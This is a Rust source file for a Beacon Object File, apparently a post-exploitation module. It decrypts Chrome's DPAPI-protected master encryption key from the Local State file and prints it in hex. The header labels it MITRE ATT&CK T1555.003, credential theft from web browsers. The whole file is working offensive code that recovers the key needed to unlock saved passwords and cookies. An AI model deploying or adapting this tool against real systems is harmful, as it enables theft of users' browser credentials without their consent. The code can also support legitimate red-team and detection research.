//! # Chrome Key BOF
//!
//! Decrypts Chrome's encryption key using CryptUnprotectData (DPAPI).
//! Takes a base64-encoded encrypted key from Chrome's Local State file,
//! strips the "DPAPI" prefix, and decrypts it.
//! ## MITRE ATT&CK
//! - T1555.003 - Credentials from Web Browsers
//!
//! ## Arguments
//! - `str`: Base64-encoded encrypted key from Chrome's Local State.

#![no_std]

use alloc::vec::Vec;
use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::GetLastError;

#[repr(C)]
struct DataBlob {
    cb_data: u32,
    pb_data: *mut u8,
}

unsafe extern "system" {
    fn CryptUnprotectData(
        p_data_in: *const DataBlob,
        pp_sz_data_descr: *mut *mut u16,
        p_optional_entropy: *const DataBlob,
        pv_reserved: *mut core::ffi::c_void,
        p_prompt_struct: *mut core::ffi::c_void,
        dw_flags: u32,
        p_data_out: *mut DataBlob,
    ) -> i32;

    fn LocalFree(h_mem: *mut core::ffi::c_void) -> *mut core::ffi::c_void;
}

const B64_TABLE: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

fn base64_decode(input: &[u8]) -> Vec<u8> {
    let mut out = Vec::new();
    let mut buf: u32 = 0;
    let mut bits: u32 = 0;

    for &b in input {
        let val = if b == b'=' {
            break;
        } else if let Some(pos) = B64_TABLE.iter().position(|&c| c == b) {
            pos as u32
        } else {
            continue;
        };

        buf = (buf << 6) | val;
        bits += 6;

        if bits >= 8 {
            bits -= 8;
            out.push((buf >> bits) as u8);
            buf &= (1 << bits) - 1;
        }
    }

    out
}

fn hex_encode(data: &[u8]) -> alloc::string::String {
    use core::fmt::Write;
    let mut s = alloc::string::String::with_capacity(data.len() * 2);
    for &b in data {
        let _ = write!(s, "{:02x}", b);
    }
    s
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);
    let b64_key = alloc::string::String::from(parser.get_str());

    if b64_key.is_empty() {
        eprintln!("No base64 key provided");
        return;
    }

    println!("chromeKey: Decrypting Chrome encryption key via DPAPI");

    let decoded = base64_decode(b64_key.as_bytes());
    if decoded.len() <= 5 {
        eprintln!("Decoded key too short (len={})", decoded.len());
        return;
    }

    let dpapi_prefix = &decoded[..5];
    if dpapi_prefix != b"DPAPI" {
        eprintln!("Key does not have expected DPAPI prefix");
        return;
    }
    let encrypted = &decoded[5..];
    println!("  Encrypted blob size: {} bytes", encrypted.len());

    let data_in = DataBlob {
        cb_data: encrypted.len() as u32,
        pb_data: encrypted.as_ptr() as *mut u8,
    };
    let mut data_out: DataBlob = DataBlob {
        cb_data: 0,
        pb_data: core::ptr::null_mut(),
    };

    let result = unsafe {
        CryptUnprotectData(
            &data_in,
            core::ptr::null_mut(),
            core::ptr::null(),
            core::ptr::null_mut(),
            core::ptr::null_mut(),
            0,
            &mut data_out,
        )
    };

    if result == 0 {
        let err = unsafe { GetLastError() };
        eprintln!("CryptUnprotectData failed ({:#X})", err);
        return;
    }

    let decrypted =
        unsafe { core::slice::from_raw_parts(data_out.pb_data, data_out.cb_data as usize) };
    let hex = hex_encode(decrypted);
    println!("  Decrypted key ({} bytes): {}", data_out.cb_data, hex);

    unsafe {
        if !data_out.pb_data.is_null() {
            LocalFree(data_out.pb_data as *mut core::ffi::c_void);
        }
    }

    println!("SUCCESS.");
}
